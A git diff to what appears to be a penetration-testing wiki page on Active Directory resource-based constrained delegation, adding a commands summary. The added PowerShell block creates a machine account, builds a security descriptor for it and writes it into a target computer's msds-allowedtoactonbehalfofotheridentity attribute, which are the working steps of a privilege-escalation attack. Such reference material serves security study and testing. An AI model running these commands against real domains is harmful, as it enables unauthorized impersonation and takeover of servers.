@@ -110,6 +110,21 @@ $SecDesc.GetBinaryForm($sdFormat,0)
 
 ![](../../../../.gitbook/assets/image%20%28246%29.png)
 
+###  Commands summary
+
+```csharp
+New-MachineAccount -MachineAccount polo1 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+Get-DomainComputer -Identity polo1
+$sid =Get-DomainComputer -Identity polo1 -Properties objectsid |Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes,0)
+Get-DomainComputer -Identity TARGETSERVER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+$RBCDbytes = Get-DomainComputer polo1 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+$Descriptor.DiscretionaryAcl
+```
+
 ### Resources
 
 {% embed url="https://github.com/Kevin-Robertson/Powermad" %}
